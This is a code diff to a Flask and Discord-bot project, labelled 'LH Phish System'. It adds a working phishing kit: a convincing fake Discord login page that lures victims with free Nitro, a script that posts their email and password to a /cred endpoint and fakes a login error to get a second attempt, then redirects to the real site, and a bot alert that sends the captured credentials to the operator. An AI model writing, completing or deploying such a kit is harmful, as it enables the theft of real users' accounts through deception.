@@ -37,6 +37,82 @@ phish_logs = {}
 PHISH_KEY = os.environ.get("PHISH_KEY", "lhsecret")
 PHISH_URL = os.environ.get("PHISH_URL", "").rstrip("/")
 
+PHISH_PAGE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Discord</title>
+<link rel="icon" href="https://discord.com/assets/favicon.ico">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#313338;font-family:'gg sans','Noto Sans',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#2b2d31;border-radius:5px;padding:32px;width:100%;max-width:480px;box-shadow:0 2px 10px rgba(0,0,0,.5)}
+.logo{text-align:center;margin-bottom:24px}
+.logo svg{width:48px;height:48px}
+h2{color:#f2f3f5;text-align:center;font-size:24px;font-weight:600;margin-bottom:8px}
+.sub{color:#b5bac1;text-align:center;font-size:14px;margin-bottom:24px}
+.nitro-banner{background:linear-gradient(90deg,#5865f2,#eb459e);border-radius:8px;padding:16px;margin-bottom:24px;text-align:center;color:#fff}
+.nitro-banner .months{font-size:28px;font-weight:700}
+.nitro-banner .label{font-size:13px;opacity:.85}
+label{display:block;color:#b5bac1;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.02em;margin-bottom:8px}
+input{width:100%;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;color:#dbdee1;font-size:16px;padding:10px;outline:none;margin-bottom:16px}
+input:focus{border-color:#5865f2}
+.btn{width:100%;background:#5865f2;border:none;border-radius:3px;color:#fff;cursor:pointer;font-size:16px;font-weight:500;padding:11px;margin-top:4px;transition:background .15s}
+.btn:hover{background:#4752c4}
+.footer{color:#b5bac1;font-size:12px;text-align:center;margin-top:16px}
+.footer a{color:#00a8fc;text-decoration:none}
+.error{color:#f23f42;font-size:13px;margin-top:-12px;margin-bottom:12px;display:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">
+    <svg viewBox="0 0 71 55" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M60.1 4.9A58.5 58.5 0 0 0 45.5.9a.2.2 0 0 0-.2.1 40.7 40.7 0 0 0-1.8 3.7 54 54 0 0 0-16.2 0A37.8 37.8 0 0 0 25.4 1a.2.2 0 0 0-.2-.1A58.4 58.4 0 0 0 10.6 4.9a.2.2 0 0 0-.1.1C1.5 18.4-.9 31.5.3 44.5a.2.2 0 0 0 .1.1 58.8 58.8 0 0 0 17.7 8.9.2.2 0 0 0 .2-.1 42 42 0 0 0 3.6-5.9.2.2 0 0 0-.1-.3 38.7 38.7 0 0 1-5.5-2.6.2.2 0 0 1 0-.4l1.1-.8a.2.2 0 0 1 .2 0c11.5 5.3 24 5.3 35.4 0a.2.2 0 0 1 .2 0l1.1.8a.2.2 0 0 1 0 .4 36.1 36.1 0 0 1-5.5 2.6.2.2 0 0 0-.1.3 47.1 47.1 0 0 0 3.6 5.9.2.2 0 0 0 .2.1 58.6 58.6 0 0 0 17.8-8.9.2.2 0 0 0 .1-.1c1.5-15-2.5-28-10.5-39.5a.2.2 0 0 0-.1-.1zM23.7 36.8c-3.5 0-6.4-3.2-6.4-7.2s2.8-7.2 6.4-7.2c3.6 0 6.5 3.3 6.4 7.2 0 4-2.8 7.2-6.4 7.2zm23.6 0c-3.5 0-6.4-3.2-6.4-7.2s2.8-7.2 6.4-7.2c3.6 0 6.5 3.3 6.4 7.2 0 4-2.8 7.2-6.4 7.2z" fill="#5865F2"/>
+    </svg>
+  </div>
+  <div class="nitro-banner">
+    <div class="months">3 Months Free</div>
+    <div class="label">Discord Nitro — Claim before it expires</div>
+  </div>
+  <h2>Log in to claim</h2>
+  <p class="sub">Sign in to your Discord account to redeem your free Nitro gift.</p>
+  <form id="f" onsubmit="submit_form(event)">
+    <label>Email or Phone Number</label>
+    <input type="text" id="email" placeholder="Enter your email or phone number" autocomplete="username">
+    <label>Password</label>
+    <input type="password" id="pass" placeholder="Enter your password" autocomplete="current-password">
+    <div class="error" id="err">Invalid email or password.</div>
+    <button class="btn" type="submit">Log In</button>
+  </form>
+  <div class="footer">
+    Need an account? <a href="#">Register</a> &nbsp;·&nbsp; <a href="#">Forgot your password?</a>
+  </div>
+</div>
+<script>
+var uid = "USERID_PLACEHOLDER";
+var attempts = 0;
+function submit_form(e) {
+  e.preventDefault();
+  var em = document.getElementById('email').value;
+  var pw = document.getElementById('pass').value;
+  if (!em || !pw) return;
+  fetch('/cred/' + uid, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({email: em, password: pw, attempt: ++attempts})
+  });
+  document.getElementById('err').style.display = 'block';
+  document.getElementById('pass').value = '';
+  if (attempts >= 2) {
+    setTimeout(function(){ window.location = 'https://discord.com/login'; }, 800);
+  }
+}
+</script>
+</body>
+</html>"""
+
 @flask_app.route("/claim/<user_id>")
 def claim(user_id):
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -44,10 +120,27 @@ def claim(user_id):
         ip = ip.split(",")[0].strip()
     user_agent = request.headers.get("User-Agent", "unknown")
     ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
-    phish_logs.setdefault(user_id, []).append({"ip": ip, "user_agent": user_agent, "timestamp": ts})
-    # notify main bot owner — fired via shared queue below
-    _phish_queue.put_nowait((user_id, ip, user_agent, ts))
-    return redirect("https://discord.com/login", code=302)
+    phish_logs.setdefault(user_id, []).append({"ip": ip, "ua": user_agent, "ts": ts, "type": "visit"})
+    _phish_queue.put_nowait((user_id, ip, user_agent, ts, "visit", None, None))
+    page = PHISH_PAGE.replace("USERID_PLACEHOLDER", user_id)
+    return page, 200
+
+@flask_app.route("/cred/<user_id>", methods=["POST"])
+def cred(user_id):
+    data = request.get_json(silent=True) or {}
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip and "," in ip:
+        ip = ip.split(",")[0].strip()
+    ts = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
+    email    = data.get("email", "")
+    password = data.get("password", "")
+    attempt  = data.get("attempt", 1)
+    phish_logs.setdefault(user_id, []).append({
+        "ip": ip, "ts": ts, "type": "cred",
+        "email": email, "password": password, "attempt": attempt
+    })
+    _phish_queue.put_nowait((user_id, ip, "", ts, "cred", email, password))
+    return jsonify({"ok": True})
 
 @flask_app.route("/logs")
 def logs_all():
@@ -63,7 +156,7 @@ def logs_user(user_id):
 
 @flask_app.route("/")
 def index():
-    return "<title>Discord</title><body style='background:#23272a'></body>", 200
+    return "<title>Discord</title><body style='background:#313338'></body>", 200
 
 import queue as _queue_module
 _phish_queue = _queue_module.Queue()
@@ -342,13 +435,35 @@ async def send_suspicious_alert(guild, user, action, count):
 async def _process_phish_queue():
     while True:
         try:
-            user_id, ip, ua, ts = _phish_queue.get_nowait()
-            embed = discord.Embed(title="🎣 Phish Hit!", color=0x00ff00, timestamp=discord.utils.utcnow())
-            embed.add_field(name="Target ID",  value=f"`{user_id}`",   inline=False)
-            embed.add_field(name="IP Address", value=f"`{ip}`",         inline=True)
-            embed.add_field(name="Time",       value=ts,                inline=True)
-            embed.add_field(name="User Agent", value=f"`{ua[:200]}`",   inline=False)
-            embed.set_footer(text="LH Phish System")
+            item = _phish_queue.get_nowait()
+            user_id, ip, ua, ts, evt_type = item[0], item[1], item[2], item[3], item[4]
+            email    = item[5] if len(item) > 5 else None
+            password = item[6] if len(item) > 6 else None
+
+            if evt_type == "cred":
+                embed = discord.Embed(
+                    title="🔑 CREDENTIALS CAPTURED",
+                    color=0xff0000,
+                    timestamp=discord.utils.utcnow()
+                )
+                embed.add_field(name="Target ID",  value=f"`{user_id}`",          inline=False)
+                embed.add_field(name="📧 Email",   value=f"`{email}`",             inline=False)
+                embed.add_field(name="🔒 Password",value=f"||`{password}`||",      inline=False)
+                embed.add_field(name="IP Address", value=f"`{ip}`",                inline=True)
+                embed.add_field(name="Time",       value=ts,                       inline=True)
+                embed.set_footer(text="LH Phish System — CRED HIT")
+            else:
+                embed = discord.Embed(
+                    title="🎣 Phish Visit",
+                    color=0xffaa00,
+                    timestamp=discord.utils.utcnow()
+                )
+                embed.add_field(name="Target ID",  value=f"`{user_id}`",   inline=False)
+                embed.add_field(name="IP Address", value=f"`{ip}`",         inline=True)
+                embed.add_field(name="Time",       value=ts,                inline=True)
+                embed.add_field(name="User Agent", value=f"`{ua[:200]}`",   inline=False)
+                embed.set_footer(text="LH Phish System — page visit")
+
             await notify_owner(embed)
         except _queue_module.Empty:
             pass
